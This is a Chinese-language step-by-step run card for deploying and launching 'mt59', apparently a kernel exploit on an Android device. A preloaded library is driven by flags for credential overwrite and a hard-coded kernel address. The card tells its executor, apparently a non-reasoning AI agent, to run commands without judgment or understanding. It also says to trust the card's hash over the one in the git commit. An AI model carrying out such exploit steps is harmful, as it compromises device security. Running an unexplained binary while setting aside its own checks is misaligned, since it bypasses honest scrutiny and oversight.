# mt59 零思考执行卡 · 第 1 弹（部署 + 体检 + 首轮 R）2026-08-16

> **本卡给"只执行、不判断"的现场。** 你只做三件事：
> 1. 按编号复制命令、贴回全部输出；
> 2. 输出和"预期"不一致 → 停在那一步，原样贴回，等评审；
> 3. 卡上没写的情况 → 停，贴原文，等评审。
>
> 所有判断（GO/WAIT、胜负、预算、下一步）全部在评审侧，你不需要理解任何一行日志。
>
> ⚠️ **哈希勘误（必读）**：git 提交信息里的 SHA256 是笔误（65 位，无效值）。
> 一切以本卡的 64 位为准（评审已三次核验），比对由机器完成，不要人眼对哈希。

---

## 第 1 步 · 部署（只做一次）

```sh
cp bin/mt59/preload.so /data/local/tmp/preload.so
echo "1064e413aa9eb5113ccb50ac9e160aeae9c160cbe9f145f90ca0f0b5ae2bd45f  /data/local/tmp/preload.so" | sha256sum -c
```

预期只有两种，照抄贴回：
- `preload.so: OK` → 进第 2 步
- `preload.so: FAILED` → 停，贴回这两行，等评审

## 第 2 步 · 体检（整块复制，机器自判）

```sh
date; cat /proc/sys/kernel/random/boot_id; getenforce
awk '{print ($1>600)?"SETTLE_OK":"SETTLE_WAIT"}' /proc/uptime
awk '{print ($1<3)?"LOAD_GO":"LOAD_WAIT"}' /proc/loadavg
ps -A | grep -E "sleep|preload" >/dev/null 2>&1 && echo RESIDUE_DIRTY || echo RESIDUE_CLEAN
grep MemAvailable /proc/meminfo
ls -la /data/local/tmp/preload.so
```

判定规则（照字面，零解释空间）：
- 三个旗标 = `SETTLE_OK` + `LOAD_GO` + `RESIDUE_CLEAN` → 直接进第 3 步
- 任何一个旗标不是上面三个词 → 停，整块贴回，等评审

## 第 3 步 · 开火（命令一个字不改，文件名就是 R4）

```sh
am kill-all
timeout 220 env \
  PSELECT_SLIDE_TRIGGER=1 \
  PSELECT_CRED=1 PSELECT_PERF_CRED=1 \
  PSELECT_RETRY=1 \
  PSELECT_PTR_MODE=1 PSELECT_PTR_STAGE=R PSELECT_PTR_STRICT=1 \
  PSELECT_PTR_RIGHT=auto \
  PSELECT_TREE_PC=ffffff8002a41b90 PSELECT_TREE_LEFT=0 \
  PSELECT_SKIP_WARMUP=1 \
  PSELECT_WAIT_SECONDS=200 \
  LD_PRELOAD=/data/local/tmp/preload.so \
  /system/bin/sleep 180 > /data/local/tmp/R4.out 2>&1
echo "R4 rc=$? enforce=$(getenforce) boot=$(cat /proc/sys/kernel/random/boot_id)"
```

- rc 是几都照贴：`0`、`3`、`124`、别的，全是"正常待审"。
- **rc=3 是 mt59 设计内的安全自弃，不是事故**，照贴。
- 12 秒左右就退出（rc=3）也算正常，照贴。
- 贴完立刻做第 4 步。

## 第 4 步 · 活体确认 + 推送（收尾）

```sh
getenforce; echo "alive_rc=$?"
cat /proc/sys/kernel/random/boot_id
```

推仓库（三样，一样不许加工）：
1. `/data/local/tmp/R4.out` 原样全文（不许 grep 过滤、不许截断、含乱码照推）
2. 第 3 步那行 `R4 rc=...` 回显
3. 第 4 步两行回显

然后**停**。不要自行跑第二轮，第 2 弹卡由评审出。

---

## 事故口令（唯一需要现场自主的物理事件）

- 手机黑屏 / 命令打了没反应：短按电源 ×2 等 60 秒 → 不行再长按重启。
  恢复后只做两件事：推 `R4.out` 现状 + `getprop ro.boot.bootreason`，然后停，等评审。
- 除此之外一切"卡上没写"的情况：停，贴原文，等评审。

## 禁止事项（对端无推理模式特别条款）

- 禁止自行重跑任何命令"再试一次"
- 禁止编辑任何文件、改任何参数、"帮忙"优化命令
- 禁止总结、翻译、解释日志——只要原文
- 禁止跑本卡之外的任何轮次（A1/C/第二轮 R 都要等评审的下一张卡）
